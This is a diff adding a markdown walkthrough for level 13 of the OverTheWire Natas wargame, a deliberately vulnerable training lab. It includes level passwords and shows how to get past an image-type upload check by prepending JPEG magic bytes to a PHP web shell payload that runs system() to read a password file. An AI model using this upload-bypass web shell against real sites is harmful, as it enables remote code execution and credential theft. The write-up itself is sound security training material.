@@ -1,0 +1,22 @@
+## Natas Level 13 → Level 14
+- Go to url: http://natas13.natas.labs.overthewire.org
+    - User: natas13
+    - Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+- It looks almost exactly the same as before
+- But with one unfortunate bonus in the source code...
+    - else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
+        echo "File is not an image";
+    - It checks if it's an image!
+- To bypass this we need to understand how file identification works
+    - As it turns out, there are magic bytes at the start of every file which denote how it's interpreted
+    - If we simply edit those magic bytes, we can trick the website into allowing us to submit a fake jpeg again
+- Let's make a similar fake jpeg
+    - echo "<?php echo system(\"cat /etc/natas_webpass/natas14\"); ?>" > totallyapicture.jpg
+- Now to edit the magic bytes
+    - First, let's insert 4 bytes using spaces
+        - vim totallyapicture.jp
+    - Next, let's turn those bytes into the correct magic bytes, which are easily found on wikipedia as FF D8 FF DB
+        - hexedit totallyapicture.jp
+    - And we should be all set!
+- Submit and open the file like in the previous level
+    - ����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
